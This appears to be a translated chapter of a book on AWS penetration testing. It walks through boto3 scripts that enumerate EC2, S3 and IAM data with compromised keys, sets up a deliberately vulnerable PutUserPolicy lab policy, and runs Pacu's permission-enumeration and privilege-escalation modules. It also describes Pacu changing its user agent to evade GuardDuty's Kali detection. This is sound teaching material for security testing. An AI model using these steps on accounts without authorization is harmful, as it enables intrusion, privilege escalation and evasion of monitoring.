# 第十章：使用窃取的密钥、Boto3 和 Pacu 提升 AWS 账户的特权

AWS 环境渗透测试的一个重要方面是枚举用户的权限，并在可能的情况下提升这些特权。知道你可以访问什么是第一场战斗，它将允许你在环境中制定攻击计划。接下来是特权升级，如果你可以进一步访问环境，你可以执行更具破坏性的攻击。在本章中，我们将深入研究 Python 的`boto3`库，学习如何以编程方式进行 AWS API 调用，学习如何使用它来自动枚举我们的权限，最后学习如何使用它来提升我们的权限，如果我们的用户容易受到提升攻击。

枚举我们的权限对于多种原因非常重要。其中之一是我们将避免需要猜测我们的权限是什么，从而在过程中防止许多访问被拒绝的错误。另一个是它可能披露有关环境其他部分的信息，比如如果特定资源在我们的**身份和访问管理**（**IAM**）策略中被标记，那么我们就知道该资源正在使用，并且在某种程度上很重要。此外，我们可以将我们的权限列表与已知的特权升级方法列表进行比较，以查看是否可以授予自己更多访问权限。我们可以获得对环境的更多访问权限，攻击的影响就越大，如果我们是真正的恶意攻击者而不是渗透测试人员，我们的攻击就会更加危险。

在本章中，我们将涵盖以下主题：

+   使用`boto3`库进行侦察

+   转储所有账户信息

+   使用受损的 AWS 密钥进行权限枚举

+   特权升级和使用 Pacu 收集凭据

# 权限枚举的重要性

无论如何，无论您是否可以提升权限，拥有确切的权限列表都非常重要。这可以节省您在攻击环境时的大量时间，因为您不需要花时间尝试猜测您可能拥有的访问权限，而是可以进行离线手动分析，以留下更小的日志记录。通过了解您拥有的访问权限，您可以避免运行测试命令以确定您是否具有特权的需要。这是有益的，因为 API 错误，特别是访问被拒绝的错误，可能会非常嘈杂，并且很可能会警告防御者您的活动。

在许多情况下，您可能会发现您的用户没有足够的权限来枚举他们的全部权限。在这些情况下，通常建议根据您已经拥有的信息做出假设，比如密钥是从哪里检索到的。也许你从一个上传文件到`S3`的 Web 应用程序中获得了这些受损的密钥。可以安全地假设这些密钥有权限上传文件到`S3`，并且它们也可能具有读取/列出权限。这组密钥很可能无法访问 IAM 服务，因此进行 IAM API 调用可能会相当嘈杂，因为它很可能会返回访问被拒绝的错误。但这并不意味着你永远不应该尝试这些权限，因为有时这是你唯一的选择，你可能需要在账户中制造一些噪音，以找出接下来的步骤。

# 使用 boto3 库进行侦察

Boto3 是 Python 的 AWS 软件开发工具包（SDK），可以在这里找到：[`boto3.amazonaws.com/v1/documentation/api/latest/index.html`](https://boto3.amazonaws.com/v1/documentation/api/latest/index.html)。它提供了与 AWS API 交互的接口，意味着我们可以以编程方式自动化和控制我们在 AWS 中所做的事情。它由 AWS 管理，因此会不断更新最新的 AWS 功能和服务。它还用于 AWS 命令行界面（CLI）的后端，因此与其在代码中运行 AWS CLI 命令相比，与这个库进行交互更有意义。

因为我们将使用 Python 来编写我们的脚本，`boto3`是与 AWS API 进行交互的完美选择。这样，我们就可以自动化我们的侦察/信息收集阶段，很多额外的工作已经被处理了（比如对 AWS API 的 HTTP 请求进行签名）。我们将使用 AWS API 来收集有关目标账户的信息，从而确定我们对环境的访问级别，并帮助我们精确制定攻击计划。

本节将假定您已经安装了 Python 3 以及`pip`包管理器。

安装`boto3`就像运行一个`pip install`命令一样简单：

```
 pip3 install boto3 
```

现在`boto3`及其依赖项应该已经安装在您的计算机上。如果`pip3`命令对您不起作用，您可能需要通过 Python 命令直接调用`pip`，如下所示：

```
 python3 -m pip install boto3 
```

# 我们的第一个 Boto3 枚举脚本

一旦安装了`boto3`，它只需要被导入到您的 Python 脚本中。在本章中，我们将从以下声明自己为`python3`的 Python 脚本开始，然后导入`boto3`：

```
#!/usr/bin/env python3

import boto3

```

我们可以通过几种不同的方式来设置`boto3`的凭据，但我们将坚持只使用一种方法，那就是通过创建一个`boto3`的`session`来进行 API 调用（[`boto3.amazonaws.com/v1/documentation/api/latest/reference/core/session.html`](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/core/session.html)）。

在上一章中，我们创建了 IAM 用户并将他们的密钥保存到了 AWS CLI 中，所以现在我们可以使用`boto3`来检索这些凭据并在我们的脚本中使用它们。我们将首先通过以下代码实例化一个`boto3`的`session`，用于`us-west-2`地区：

```
session = boto3.session.Session(profile_name='Test', region_name='us-west-2') 
```

这段代码创建了一个新的`boto3` `session`，并将在计算机上搜索名为`Test`的 AWS CLI 配置文件，这是我们已经设置好的。通过使用这种方法来处理我们脚本中的凭据，我们不需要直接在代码中包含硬编码的凭据。

现在我们已经创建了我们的 session，我们可以使用该 session 来创建`boto3`客户端，然后用于对 AWS 进行 API 调用。客户端在创建时接受多个参数来管理不同的配置值，但一般来说，我们只需要担心一个参数，那就是`service_name`参数。它是一个位置参数，将始终是我们传递给客户端的第一个参数。以下代码设置了一个新的`boto3`客户端，使用我们的凭据，目标是 EC2 AWS 服务：

```
   client = session.client('ec2')  
```

现在我们可以使用这个新创建的客户端来对 EC2 服务进行 AWS API 调用。

有关可用方法的列表，您可以访问`boto3`文档中的 EC2 参考页面：[`boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#client`](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#client)。

有许多方法可供选择，但为了信息枚举的目的，我们将从`describe_instances`方法开始，就像我们之前展示的那样（即在第九章的*在 AWS 上使用 IAM 访问密钥*部分中所示），使用 AWS CLI，将枚举目标区域中的 EC2 实例。我们可以运行此 API 调用并使用以下代码行检索结果：

```
   response = client.describe_instances() 
```

`describe_instances`方法接受一些可选参数，但对于我们进行的第一个调用，我们还不需要。这个方法的文档告诉我们，它支持分页。根据您要定位的账户中的 EC2 实例数量，您可能无法在第一次 API 调用中收到所有结果。我们可以通过创建一个单独的变量来存储所有枚举的实例，并检查结果是否完整来解决这个问题。

我们添加的上一行代码（`response = client.describe_instances()`）需要稍微重新排列一下，以便最终如下所示：

```
# First, create an empty list for the enumerated instances to be stored in
instances = []

# Next, make our initial API call with MaxResults set to 1000, which is the max
# This will ensure we are making as few API calls as possible
response = client.describe_instances(MaxResults=1000)

# The top level of the results will be "Reservations" so iterate through those
for reservation in response['Reservations']:
    # Check if any instances are in this reservation
    if reservation.get('Instances'):
        # Merge the list of instances into the list we created earlier
        instances.extend(reservation['Instances'])

# response['NextToken'] will be a valid value if we don't have all the results yet
# It will be "None" if we have completed enumeration of the instances
# So we need check if it has a valid value, and because this could happen again, we will need to make it a loop

# As long as NextToken has a valid value, do the following, otherwise skip it
while response.get('NextToken'):
    # Run the API call again while supplying the previous calls NextToken
    # This will get us the next page of 1000 results
    response = client.describe_instances(MaxResults=1000, NextToken=response['NextToken'])

    # Iterate the reservations and add any instances found to our variable again
    for reservation in response['Reservations']:
        if reservation.get('Instances'):
            instances.extend(reservation['Instances'])
```

现在我们可以确保即使在具有数千个 EC2 实例的大型环境中，我们也有完整的实例列表。

# 保存数据

现在我们有了 EC2 实例列表，但我们应该怎么处理呢？一个简单的解决方案是将数据输出到本地文件中，以便以后可以引用。我们可以通过导入`json` Python 库并将`instances`的内容转储到与我们的脚本相同的目录中的文件中来实现这一点。让我们将以下代码添加到我们的脚本中：

```
# Import the json library
import json

# Open up the local file we are going to store our data in
with open('./ec2-instances.json', 'w+') as f:
    # Use the json library to dump the contents to the newly opened file with some indentation to make it easier to read. Default=str to convert dates to strings prior to dumping, so there are no errors
    json.dump(instances, f, indent=4, default=str)
```

现在完整的脚本（不包括注释）应该如下所示：

```
#!/usr/bin/env python3

import boto3
import json

session = boto3.session.Session(profile_name='Test', region_name='us-west-2')
client = session.client('ec2')

instances = []

response = client.describe_instances(MaxResults=1000)

for reservation in response['Reservations']:
    if reservation.get('Instances'):
        instances.extend(reservation['Instances'])

while response.get('NextToken'):
    response = client.describe_instances(MaxResults=1000, NextToken=response['NextToken'])

    for reservation in response['Reservations']:
        if reservation.get('Instances'):
            instances.extend(reservation['Instances'])

with open('./ec2-instances.json', 'w+') as f:
    json.dump(instances, f, indent=4, default=str)
```

现在我们可以使用以下命令运行此脚本：

```
python3 our_script.py 
```

在当前目录中应该创建一个名为`ec2-instances.json`的新文件，当您打开它时，您应该看到类似以下截图的内容，其中列出了`us-west-2`区域中所有 EC2 实例的 JSON 表示。这些 JSON 数据包含有关 EC2 实例的基本信息，包括标识信息、网络信息和适用于 EC2 实例的其他配置。但是，这些细节目前并不重要：

![](img/12e9ca4d-6999-4d21-9b92-f52d23776c29.png)

这个文件现在应该包含我们之前在代码中指定的区域中所有实例的枚举信息。

# 添加一些 S3 枚举

现在假设我们想要枚举账户中存在的`S3`存储桶以及这些存储桶中的文件。目前，我们的测试 IAM 用户没有`S3`权限，因此我已经直接将 AWS 托管策略`AmazonS3ReadOnlyAccess`附加到我们的用户上。如果您需要为自己的用户执行此操作，请参考第九章的*在 AWS 上使用身份访问管理*。

我们将在已经创建的现有脚本的底部添加以下代码。首先，我们将想要弄清楚账户中有哪些`S3`存储桶，因此我们需要设置一个新的`boto3`客户端来定位`S3`：

```
client = session.client('s3') 
```

然后，我们将使用`list_buckets`方法来检索账户中`S3`存储桶的列表。请注意，与`ec2:DescribeInstances` API 调用不同，`s3:ListBuckets` API 调用不是分页的，您可以期望在单个响应中看到账户中的所有存储桶：

```
response = client.list_buckets() 
```

返回的数据中包含一些我们目前不感兴趣的信息（例如存储桶创建日期），因此我们将遍历响应并仅提取存储桶的名称：

```
bucket_names = []
  for bucket in response['Buckets']:
       bucket_names.append(bucket['Name'])
```

现在我们已经知道账户中所有存储桶的名称，我们可以继续使用`list_objects_v2`API 调用列出每个存储桶中的文件。`list_objects_v2`API 调用是一个分页操作，因此可能不是每个对象都会在第一个 API 调用中返回给我们，因此我们将在脚本中考虑到这一点。我们将添加以下代码到我们的脚本中：

```
# Create a dictionary to hold the lists of object (file) names
bucket_objects = {}

# Loop through each bucket we found
for bucket in bucket_names:
    # Run our first API call to pull in the objects
    response = client.list_objects_v2(Bucket=bucket, MaxKeys=1000)

    # Check if there are any objects returned (none will return if no objects are in the bucket)
    if response.get('Contents'):
        # Store the fetched set of objects
        bucket_objects[bucket] = response['Contents']
    else:
        # Set this bucket to an empty object and move to the next bucket
        bucket_objects[bucket] = []
        continue

    # Check if we got all the results or not, loop until we have everything if so
    while response['IsTruncated']:
        response = client.list_objects_v2(Bucket=bucket, MaxKeys=1000, ContinuationToken=response['NextContinuationToken'])

        # Store the newly fetched set of objects
        bucket_objects[bucket].extend(response['Contents'])
```

当循环完成时，我们应该得到`bucket_objects`是一个字典，其中每个键是账户中的存储桶名称，它包含存储在其中的对象列表。

与我们将所有 EC2 实例数据转储到`ec2-instances.json`类似，我们现在将所有文件信息转储到多个不同的文件中，文件名是存储桶的名称。我们可以添加以下代码来实现：

```
# We know bucket_objects has a key for each bucket so let's iterate that
for bucket in bucket_names:
    # Open up a local file with the name of the bucket
    with open('./{}.txt'.format(bucket), 'w+') as f:
        # Iterate through each object in the bucket
        for bucket_object in bucket_objects[bucket]:
            # Write a line to our file with the object details we are interested in (file name and size)
            f.write('{} ({} bytes)\n'.format(bucket_object['Key'], bucket_object['Size']))
```

现在我们已经添加到原始脚本的最终代码应该如下（不包括注释）：

```
client = session.client('s3')

bucket_names = []

response = client.list_buckets()
for bucket in response['Buckets']:
    bucket_names.append(bucket['Name'])

bucket_objects = {}

for bucket in bucket_names:
    response = client.list_objects_v2(Bucket=bucket, MaxKeys=1000)

    bucket_objects[bucket] = response['Contents']

    while response['IsTruncated']:
        response = client.list_objects_v2(Bucket=bucket, MaxKeys=1000, ContinuationToken=response['NextContinuationToken'])

        bucket_objects[bucket].extend(response['Contents'])

for bucket in bucket_names:
    with open('./{}.txt'.format(bucket), 'w+') as f:
        for bucket_object in bucket_objects[bucket]:
            f.write('{} ({} bytes)\n'.format(bucket_object['Key'], bucket_object['Size']))
```

现在我们可以使用与之前相同的命令再次运行我们的脚本：

```
python3 our_script.py 
```

当它完成时，它应该再次枚举 EC2 实例并将它们存储在`ec2-instances.json`文件中，现在账户中每个存储桶也应该有一个文件，其中包含其中所有对象的文件名和文件大小。以下屏幕截图显示了从我们的一个`test`存储桶中下载的信息的片段：

![](img/1e52f85b-0308-4d24-9a49-a31bca5e6399.png)

现在我们知道哪些文件存在，我们可以尝试使用 AWS S3 API 命令`get_object`来下载听起来有趣的文件，但我会把这个任务留给你。请记住，数据传输会导致发生在 AWS 账户中的费用，因此通常不明智编写尝试下载存储桶中的每个文件的脚本。如果你这样做了，你可能会轻易地遇到一个存储了数百万兆字节数据的存储桶，并导致 AWS 账户产生大量意外费用。这就是为什么根据名称和大小选择要下载的文件是很重要的。

# 转储所有账户信息

AWS 使得可以通过多种方法（或 API）从账户中检索数据，其中一些方法比其他方法更容易。这对我们作为攻击者来说是有利的，因为我们可能被拒绝访问一个权限，但允许访问另一个权限，最终可以用来达到相同的目标。

# 一个新的脚本 - IAM 枚举

在这一部分，我们将从一个新的脚本开始，目标是枚举 IAM 服务和 AWS 账户的各种数据点。脚本将从我们已经填写的一些内容开始：

```
#!/usr/bin/env python3

import boto3

session = boto3.session.Session(profile_name='Test', region_name='us-west-2')
client = session.client('iam')
```

我们已经声明文件为`python3`文件，导入了`boto3`库，使用`us-west-2`区域`Test`配置文件中的凭据创建了我们的`boto3` `session`，然后使用这些凭据为 IAM 服务创建了一个`boto3`客户端。

我们将从`get_account_authorization_details`API 调用开始（[`boto3.amazonaws.com/v1/documentation/api/latest/reference/services/iam.html#IAM.Client.get_account_authorization_details`](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/iam.html#IAM.Client.get_account_authorization_details)），该调用从账户中返回大量信息，包括用户、角色、组和策略信息。这是一个分页的 API 调用，因此我们将首先创建空列表来累积我们枚举的数据，然后进行第一个 API 调用：

```
# Declare the variables that will store the enumerated information
user_details = []
group_details = []
role_details = []
policy_details = []

# Make our first get_account_authorization_details API call
response = client.get_account_authorization_details()

# Store this first set of data
if response.get('UserDetailList'):
    user_details.extend(response['UserDetailList'])
if response.get('GroupDetailList'):
    group_details.extend(response['GroupDetailList'])
if response.get('RoleDetailList'):
    role_details.extend(response['RoleDetailList'])
if response.get('Policies'):
    policy_details.extend(response['Policies'])
```

然后我们需要检查响应是否分页，以及是否需要进行另一个 API 调用来获取更多结果。就像之前一样，我们可以使用一个简单的循环来做到这一点：

```
# Check to see if there is more data to grab
while response['IsTruncated']:
    # Make the request for the next page of details
    response = client.get_account_authorization_details(Marker=response['Marker'])

    # Store the data again
    if response.get('UserDetailList'):
        user_details.extend(response['UserDetailList'])
    if response.get('GroupDetailList'):
        group_details.extend(response['GroupDetailList'])
    if response.get('RoleDetailList'):
        role_details.extend(response['RoleDetailList'])
    if response.get('Policies'):
        policy_details.extend(response['Policies'])
```

您可能已经注意到 AWS API 调用参数和响应的名称和结构存在不一致性（例如`ContinuationToken`与`NextToken`与`Marker`）。这是无法避免的，`boto3`库在其命名方案上存在不一致性，因此重要的是阅读您正在运行的命令的文档。

# 保存数据（再次）

现在，就像以前一样，我们希望将这些数据保存在某个地方。我们将使用以下代码将其存储在四个单独的文件`users.json`、`groups.json`、`roles.json`和`policies.json`中：

```
# Import the json library
import json

# Open up each file and dump the respective JSON into them
with open('./users.json', 'w+') as f:
    json.dump(user_details, f, indent=4, default=str)
with open('./groups.json', 'w+') as f:
    json.dump(group_details, f, indent=4, default=str)
with open('./roles.json', 'w+') as f:
    json.dump(role_details, f, indent=4, default=str)
with open('./policies.json', 'w+') as f:
    json.dump(policy_details, f, indent=4, default=str)
```

这将使最终脚本（不包括注释）看起来像下面这样：

```
#!/usr/bin/env python3

import boto3
import json

session = boto3.session.Session(profile_name='Test', region_name='us-west-2')
client = session.client('iam')

user_details = []
group_details = []
role_details = []
policy_details = []

response = client.get_account_authorization_details()

if response.get('UserDetailList'):
    user_details.extend(response['UserDetailList'])
if response.get('GroupDetailList'):
    group_details.extend(response['GroupDetailList'])
if response.get('RoleDetailList'):
    role_details.extend(response['RoleDetailList'])
if response.get('Policies'):
    policy_details.extend(response['Policies'])

while response['IsTruncated']:
    response = client.get_account_authorization_details(Marker=response['Marker'])
    if response.get('UserDetailList'):
        user_details.extend(response['UserDetailList'])
    if response.get('GroupDetailList'):
        group_details.extend(response['GroupDetailList'])
    if response.get('RoleDetailList'):
        role_details.extend(response['RoleDetailList'])
    if response.get('Policies'):
        policy_details.extend(response['Policies'])

with open('./users.json', 'w+') as f:
    json.dump(user_details, f, indent=4, default=str)
with open('./groups.json', 'w+') as f:
    json.dump(group_details, f, indent=4, default=str)
with open('./roles.json', 'w+') as f:
    json.dump(role_details, f, indent=4, default=str)
with open('./policies.json', 'w+') as f:
    json.dump(policy_details, f, indent=4, default=str)
```

现在我们可以使用以下命令运行脚本：

```
python3 get_account_details.py 
```

当前文件夹应该有四个新文件，其中包含帐户中用户、组、角色和策略的详细信息。

# 使用受损的 AWS 密钥进行权限枚举

我们现在可以扩展上一节的脚本，使用收集的数据来确定您当前用户具有的确切权限，通过相关不同文件中存储的数据。为此，我们首先需要在我们拉下来的用户列表中找到我们当前的用户。

# 确定我们的访问级别

在攻击场景中，您可能不知道当前用户的用户名，因此我们将添加使用`iam:GetUser` API 来确定该信息的代码行（请注意，如果您的凭据属于角色，则此调用将失败）：

```
   username = client.get_user()['User']['UserName'] 
```

然后，我们将遍历我们收集的用户数据，并寻找我们当前的用户：

```
# Define a variable that will hold our user
current_user = None

# Iterate through the enumerated users
for user in user_details:
    # See if this user is our user
    if user['UserName'] == username:
        # Set the current_user variable to our user
        current_user = user

        # We found the user, so we don't need to iterate through the rest of them
        break
```

现在我们可以检查一些可能附加到我们用户对象的不同信息。如果某个信息不存在，那么意味着我们不需要担心它的值。

为了得出我们用户的完整权限列表，我们需要检查以下数据：`UserPolicyList`、`GroupList`和`AttachedManagedPolicies`。`UserPolicyList`将包含附加到我们用户的所有内联策略，`AttachedManagedPolicies`将包括附加到我们用户的所有托管策略，`GroupList`将包含我们用户所属的组的列表。对于每个策略，我们需要提取与之关联的文档，对于组，我们需要检查附加到它的内联策略和托管策略，然后提取与之关联的文档，最终得出一个明确的权限列表。

# 分析附加到我们用户的策略

我们将首先收集附加到我们用户的内联策略文档。幸运的是，任何内联策略的整个文档都包含在我们的用户中。我们将向我们的脚本添加以下代码：

```
# Create an empty list that will hold all the policies related to our user
my_policies = []

# Check if any inline policies are attached to my user
if current_user.get('UserPolicyList'):
    # Iterate through the inline policies to pull their documents
    for policy in current_user['UserPolicyList']:
        # Add the policy to our list
        my_policies.append(policy['PolicyDocument'])
```

现在`my_policies`应该包括直接附加到我们用户的所有内联策略。接下来，我们将收集附加到我们用户的托管策略文档。策略文档并未直接附加到我们的用户，因此我们必须使用标识信息在我们的`policy_details`变量中找到策略文档：

```
# Check if any managed policies are attached to my user
if current_user.get('AttachedManagedPolicies'):
    # Iterate through the list of managed policies
    for managed_policy in user['AttachedManagedPolicies']:
        # Note the policy ARN so we can find it in our other variable
        policy_arn = managed_policy['PolicyArn']

        # Iterate through the policies stored in policy_details to find this policy
        for policy_detail in policy_details:
            # Check if we found the policy yet
            if policy_detail['Arn'] == policy_arn:
                # Determine the default policy version, so we know which version to grab
                default_version = policy_detail['DefaultVersionId']

                # Iterate the available policy versions to find the one we want
                for version in policy_detail['PolicyVersionList']:
                    # Check if we found the default version yet
                    if version['VersionId'] == default_version:
                        # Add this policy document to our original variable
                        my_policies.append(version['Document'])

                        # We found the document, so exit this loop
                        break
                # We found the policy, so exit this loop
                break
```

现在`my_policies`应该包括直接附加到我们用户的所有内联策略和托管策略。接下来，我们将找出我们所属的组，然后枚举附加到每个组的内联策略和托管策略。完成后，我们将得到分配给我们用户的完整权限列表：

```
# Check if we are in any groups
if current_user.get('GroupList'):
    # Iterate through the list of groups
    for user_group in current_user['GroupList']:
        # Iterate through all groups to find this one
        for group in group_details:
            # Check if we found this group yet
            if group['GroupName'] == user_group:
                # Check for any inline policies on this group
                if group.get('GroupPolicyList'):
                    # Iterate through each inline policy
                    for inline_policy in group['GroupPolicyList']:
                        # Add the policy document to our original variable
                        my_policies.append(inline_policy['PolicyDocument'])

                # Check for any managed policies on this group
                if group.get('AttachedManagedPolicies'):
                    # Iterate through each managed policy detail
                    for managed_policy in group['AttachedManagedPolicies']:
                        # Grab the policy ARN
                        policy_arn = managed_policy['PolicyArn']

                        # Find the policy in our list of policies
                        for policy in policy_details:
                            # Check and see if we found it yet
                            if policy['Arn'] == policy_arn:
                                # Get the default version
                                default_version = policy['DefaultVersionId']

                                # Find the document for the default version
                                for version in policy['PolicyVersionList']:
                                    # Check and see if we found it yet
                                    if version['VersionId'] == default_version:
                                        # Add the document to our original variable
                                        my_policies.append(version['Document'])

                                        # Found the version, so break out of this loop
                                        break
                                    # Found the policy, so break out of this loop
                                    break
```

现在脚本应该完成了，我们的`my_policies`变量应该包含直接附加到我们用户的所有内联和托管策略的策略文档，以及附加到我们用户所属的每个组的所有内联和托管策略。我们可以通过添加一个最终片段来检查这些结果，将数据输出到本地文件：

```
with open('./my-user-permissions.json', 'w+') as f:
 json.dump(my_policies, f, indent=4, default=str)
```

我们可以使用相同的命令运行文件：

```
 python3 get_account_details.py
```

然后，我们可以检查生成的`my-user-permissions.json`，其中应包含适用于您的用户的所有策略和权限的列表。它应该看起来像以下的屏幕截图：

![](img/1a13046f-3011-49de-9475-47e670bddbcc.png)

现在我们有一个很好的权限列表，我们可以使用这些权限，以及我们可以在什么条件下应用这些权限。

# 另一种方法

需要注意的重要一点是，如果用户没有`iam:GetAccountAuthorization`权限，此脚本将失败，因为他们将无法收集用户、组、角色和策略列表。为了可能解决这个问题，我们可以参考本节开头的部分，其中指出有时通过 AWS API 有多种方法来做某事，这些不同的方法需要不同的权限集。

在我们的用户没有`iam:GetAccountAuthorizationDetails`权限的情况下，但他们拥有其他 IAM 读取权限，可能仍然有可能枚举我们的权限列表。我们不会运行并创建执行此操作的脚本，但如果您愿意尝试，这里是一个一般指南：

1.  检查我们是否有`iam:GetAccountAuthorizationDetails`权限

1.  如果是这样，请运行我们刚创建的脚本

1.  如果不是，请转到步骤 2

1.  使用`iam:GetUser` API 确定我们是什么用户（请注意，这对于角色不起作用！）

1.  使用`iam:ListUserPolicies` API 获取附加到我们的用户的内联策略列表

1.  使用`iam:GetUserPolicy` API 获取每个内联策略的文档

1.  使用`iam:ListAttachedUserPolicies` API 获取附加到我们的用户的托管策略列表

1.  使用`iam:GetPolicy` API 确定附加到我们的用户的每个托管策略的默认版本

1.  使用`iam:GetPolicyVersion` API 获取附加到我们的用户的每个托管策略的策略文档

1.  使用`iam:ListGroupsForUser` API 查找我们的用户属于哪些组

1.  使用`iam:ListGroupPolicies` API 列出附加到每个组的内联策略

1.  使用`iam:GetGroupPolicy` API 获取附加到每个组的每个内联策略的文档

1.  使用`iam:ListAttahedGroupPolicies` API 列出附加到每个组的托管策略

1.  使用`iam:GetPolicy` API 确定附加到每个组的每个托管策略的默认版本

1.  使用`iam:GetPolicyVersion` API 获取附加到每个组的每个托管策略的策略文档

正如您可能已经注意到的，这种权限枚举方法需要对 AWS 进行更多的 API 调用，而且可能会对倾听的防御者产生更大的影响，比我们的第一种方法。但是，如果您没有`iam:GetAccountAuthorizationDetails`权限，但您有权限遵循列出的所有步骤，那么这可能是正确的选择。

# 使用 Pacu 进行特权升级和收集凭据

在尝试检测和利用我们目标用户的特权升级之前，我们将添加另一个策略，使用户容易受到特权升级的影响。在继续之前，向我们的原始`Test`用户添加一个名为`PutUserPolicy`的内联策略，并使用以下文档：

```
{ 
    "Version": "2012-10-17", 
    "Statement": [ 
        { 
            "Effect": "Allow", 
            "Action": "iam:PutUserPolicy", 
            "Resource": "*" 
        } 
    ] 
} 
```

此策略允许我们的用户在任何用户上运行`iam:PutUserPolicy` API 操作。

# Pacu - 一个开源的 AWS 利用工具包

**Pacu**是由 Rhino Security Labs 编写的开源 AWS 利用工具包。它旨在帮助渗透测试人员攻击 AWS 环境；因此，现在我们将快速安装和设置 Pacu，以自动化我们一直在尝试的这些攻击。

有关安装和配置的更详细说明可以在第十九章中找到，*将所有内容整合在一起-真实世界的 AWS 渗透测试*；这些步骤旨在让您尽快设置并使用 Pacu。

Pacu 可以通过 GitHub 获得，因此我们需要运行一些命令来安装所有内容（我们正在运行 Kali Linux）。首先，让我们确认是否已安装`git`：

```
 apt-get install git 
```

然后，我们将从 GitHub 克隆 Pacu 存储库（[`github.com/RhinoSecurityLabs/pacu`](https://github.com/RhinoSecurityLabs/pacu)）:

```
 git clone https://github.com/RhinoSecurityLabs/pacu.git
```

然后，我们将切换到 Pacu 目录并运行安装脚本，这将确保我们安装了正确的 Python 版本（Python 3.5 或更高版本），并使用`pip3`安装必要的依赖项：

```
 cd pacu && bash install.sh 
```

现在 Pacu 应该已经成功安装，我们可以使用以下命令启动它：

```
 python3 pacu.py
```

将会出现一些消息，让您知道已生成新的设置文件并创建了新的数据库。它将检测到我们尚未设置`session`，因此会要求我们命名一个新的会话以创建。Pacu 会话基本上是一个项目，您可以在同一安装中拥有多个独立的 Pacu 会话。会话数据存储在本地 SQLite 数据库中，每个单独的会话可以被视为一个项目或目标公司。当您在多个环境上工作时，它允许您保持数据和凭证的分离。每个 Pacu 会话之间的日志和配置也是分开的；我们将命名我们的会话为`Demo`：

![](img/58a56fd7-354a-48e5-aa14-01e84088d581.png)

一旦我们成功创建了新会话，将会呈现一些有关 Pacu 的有用信息，我们稍后将更深入地了解这些信息。

# Kali Linux 检测绕过

因为我们正在 Kali Linux 上运行 Pacu，所以在帮助输出之后，我们会看到有关我们用户代理的额外消息，类似于以下截图中显示的内容：

![](img/1bfd49e7-c99d-4886-89c8-3d794ea0a6c5.png)

我们可以看到 Pacu 已经检测到我们正在运行 Kali Linux，并相应地修改了我们的用户代理。 `GuardDuty`是 AWS 提供的众多安全服务之一，用于检测和警报 AWS 环境中发生的可疑行为。 `GuardDuty`检查的一项内容是您是否正在从 Kali Linux 发起 AWS API 调用（[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_pentest.html#pentest1`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_pentest.html#pentest1)）。我们希望在攻击某个账户时尽量触发尽可能少的警报，因此 Pacu 已经内置了自动绕过这项安全措施。 `GuardDuty`检查发起 API 调用的用户代理，以查看是否能从中识别 Kali Linux，并在识别到时发出警报。Pacu 将我们的用户代理修改为一个通用用户代理，不会引起`GuardDuty`的怀疑。

# Pacu CLI

紧接着这个输出，我们可以看到一个名为 Pacu CLI 的东西：

![](img/5db694f7-e5df-446b-a60f-cf8b6eed15db.png)

这显示了我们正在 Pacu CLI 中，我们的活动会话名为 Demo，我们没有活动密钥。我们可以通过几种不同的方式向 Pacu 数据库添加一些 AWS 密钥，例如使用`set_keys`命令，或者从 AWS CLI 导入它们。

我们已经设置了 AWS 密钥以便与 AWS CLI 一起使用，因此最简单的方法是从 AWS CLI 导入它们。我们可以通过运行以下 Pacu 命令导入我们的`Test` AWS CLI 配置文件：

```
 import_keys Test 
```

此命令应返回以下输出：

```
Imported keys as "imported-Test"
```

现在，如果我们运行`whoami`命令，我们应该能够看到我们的访问密钥 ID 和秘密访问密钥已被导入，如果我们查看 Pacu CLI，我们现在可以看到，而不是`No Keys Set`，它显示了我们导入的密钥的名称。Pacu CLI 的位置指示了当前凭证集的位置：

![](img/6a20c952-5fa3-427d-9756-85a44e405fef.png)

现在我们已经设置好了 Pacu，我们可以通过从 Pacu CLI 运行`ls`命令来检索当前模块的列表。为了自动化本章前面我们已经完成的一个过程，我们将使用`iam__enum_permissions`模块。该模块将执行必要的 API 调用和数据解析，以收集我们的活动凭证集的确认权限列表。该模块也可以针对账户中的其他用户或角色运行，因此为了更好地了解其功能，运行以下命令：

```
 help iam__enum_permissions 
```

现在你应该能够看到该模块的描述以及它支持的参数。为了针对我们自己的用户运行该模块，我们不需要传入任何参数，所以我们可以直接运行以下命令来执行该模块：

```
 run iam__enum_permissions 
```

如果当前的凭证集有权限枚举他们的权限（这是应该的，因为我们在本章前面设置了），输出应该表明模块成功地收集了该用户或角色的权限：

![](img/66bcf05a-27fc-4c4e-9df3-a19880b75ab2.png)

现在我们已经枚举了我们用户的权限，我们可以通过再次运行`whoami`命令来查看枚举的数据。这次，大部分数据将被填充。

Groups 字段将包含我们的用户所属的任何组的信息，Policies 字段将包含任何附加到我们的用户的 IAM 策略的信息。识别信息，如`UserName`，`Arn`，`AccountId`和`UserId`字段也应该填写。

在输出的底部，我们可以看到`PermissionsConfirmed`字段，其中包含 true 或 false，并指示我们是否能够成功枚举我们拥有的权限。如果我们被拒绝访问某些 API 并且无法收集完整的权限列表，该值将为 false。

`Permissions`字段将包含我们的用户被赋予的每个 IAM 权限，这些权限可以应用到的资源以及使用它们所需的条件。就像我们在本章前面编写的脚本一样，这个列表包含了附加到我们的用户的任何内联或托管策略授予的权限，以及附加到我们的用户所属的任何组的任何内联或托管策略授予的权限。

# 从枚举到特权升级

我们的权限已经被枚举，所以现在我们将尝试使用这些权限进行环境中的特权升级。还有一个 Pacu 模块叫做`iam_privesc_scan`。该模块将运行并检查你枚举的权限集，以查看你的用户是否容易受到 AWS 中 21 种不同已知的特权升级方法中的任何一种的影响。

Rhino Security Labs 撰写了一篇文章，详细介绍了这 21 种不同的特权升级方法以及如何手动利用它们，你可以在这里参考：[`rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/`](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)。

在模块检查我们是否容易受到这些方法中的任何一种的影响之后，它将尝试利用它们来为我们进行特权升级，这让我们的工作变得容易。如果你对特权升级模块想了解更多，你可以使用`help`命令来查看：

```
help iam__privesc_scan
```

正如你所看到的，这个模块也可以针对账户中的其他用户和角色运行，以确定它们是否也容易受到特权升级的影响，但目前我们只会针对我们自己的用户。

我们已经枚举了我们的权限，所以我们可以继续运行特权升级模块而不带任何参数：

```
run iam__privesc_scan
```

